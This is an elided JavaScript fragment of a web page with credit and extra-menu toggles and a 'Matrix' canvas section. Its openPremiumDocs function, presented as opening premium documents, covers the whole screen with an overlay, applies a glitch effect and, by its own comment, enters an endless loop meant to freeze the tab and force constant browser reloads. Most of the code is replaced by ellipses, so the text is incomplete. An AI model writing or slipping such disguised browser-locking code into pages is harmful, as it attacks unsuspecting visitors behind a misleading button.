...
function openCredits() {
    ...
    box.style.display = box.style.display === "block" ? "none" : "block"; // Toggle display
...
// Global flag to prevent multiple menu generations
...
function openExtra() {
    ...
    extraMenuOpen = true; // Set flag to prevent adding buttons again
}
...
function openPremiumDocs() {
    ...
    function waiting() {
        ...
        elem.style.top = "0";
        elem.style.left = "0";
        elem.style.width = "100%"; // Full width
        elem.style.height = "100%"; // Full height
        elem.style.zIndex = 99999999; // Extremely high Z-index to cover everything
    ...
    // The glitchy blur/static overlay from your original code (simplified and kept)
    ...
    applyGlitchEffect(document); // Run the glitch effect immediately
    ...
    setTimeout(() => {
        ...
        // This is the code that will freeze the tab and force the browser to reload constantly.
        while (true) {
...
// ===== MATRIX =====
// Note: We need to define 'matrix' before using it, which is the canvas element.
